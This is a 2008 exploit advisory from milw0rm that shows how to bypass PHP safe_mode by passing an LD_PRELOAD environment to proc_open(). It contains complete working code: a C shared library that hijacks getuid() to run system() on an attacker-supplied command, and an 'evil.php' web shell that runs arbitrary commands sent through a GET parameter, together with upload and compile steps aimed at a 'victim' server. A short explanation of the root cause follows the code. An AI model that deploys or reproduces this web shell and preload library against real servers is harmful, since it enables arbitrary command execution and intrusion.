<html><head><title>PHP safe_mode bypass via proc_open() and custom environment</title></head><pre>
-----------------------------------------------------------------------
+ safe-bypass-procopen.txt - yet another way to bypass PHP safe_mode. +
+ By Milen Rangelov &lt;gat3way@gat3way.eu&gt;                              +
-----------------------------------------------------------------------


This *should* work provided that you have met the following requirements:

1) A writable directory under documentroot to place those files (obviously)
2) You don't have proc_open in your disabled_functions list
3) You are able to compile a shared library on the same platform as the target web server.


The reason I'm publishing that is because I posted a similar bug (putenv()+mail()) which was titled as &quot;Bogus&quot; one by the PHP developers.

Now, this one uses quite the same concept, only different means.


How does this work?
-------------------

You will need to upload 2 files - one precompiled shared library and a php script. Place them in the writable dir and just open http://victim/path/evil.php?c=arbitrarycommand

You'll need to change the $path variable to match the writable directory


Here is the library code, compile with cc -o a.so -fPIC -shared a.c

a.c:
----

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int getuid()
{
char *en;
char *buf=malloc(300);
FILE *a;

unsetenv(&quot;LD_PRELOAD&quot;);
a=fopen(&quot;.comm&quot;,&quot;r&quot;);
buf=fgets(buf,100,a);
write(2,buf,strlen(buf));
fclose(a);
rename(&quot;a.so&quot;,&quot;b.so&quot;);
system(buf);
system(&quot;mv output.txt .comm1&quot;);
rename(&quot;b.so&quot;,&quot;a.so&quot;);
free(buf);
return 0;
}

*cut*



And that is the PHP script:

evil.php:
-------------------------
&lt;?php

$path=&quot;/var/www&quot;; //change to your writable path


$a=fopen($path.&quot;/.comm&quot;,&quot;w&quot;);
fputs($a,$_GET[&quot;c&quot;]);
fclose($a);

$descriptorspec = array(
 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),
 1 =&gt; array(&quot;file&quot;, $path.&quot;/output.txt&quot;,&quot;w&quot;),
 2 =&gt; array(&quot;file&quot;, $path.&quot;/errors.txt&quot;, &quot;a&quot; )
);

$cwd = '.';
$env = array('LD_PRELOAD' =&gt; $path.&quot;/a.so&quot;);
$process = proc_open('id &gt; /tmp/a', $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed


sleep(1);
$a=fopen($path.&quot;/.comm1&quot;,&quot;r&quot;);

echo &quot;&lt;pre&gt;&lt;b&gt;&quot;;
while (!feof($a))
{$b=fgets($a);echo $b;}
fclose($a);
echo &quot;&lt;/pre&gt;&quot;;

?&gt;

*cut*


Yeah, I know, it's written pretty lame, it's just a PoC.



Why does that work?
-------------------

Because the PHP devs like to trust the environment. Especially the dynamic loader variables. In the original bug I posted into their bugtracking system, I suggested that they clean them in mail() for example, but....yuck the bug was classified as *bogus*.

This demonstrates exactly the same problem. If you have safe_mode enabled, you cannot execute anything except the binaries in the safe mode exec dir. They prepend a trailing slash to your command string and strip &quot;..&quot;. Yet, proc_open() enables you to provide your own environment to pass to the new process. proc_open() executes &quot;/bin/sh -c yourcommand&quot; and even though yourcommand is invalid, the LD_PRELOAD is passed to /bin/sh.

/bin/sh loads your h4h0r library and then BOOM!


I hope you'd find that useful.


BTW....!!! Dolu naglite programisti :DDD !!!

# milw0rm.com [2008-12-09]</pre></html>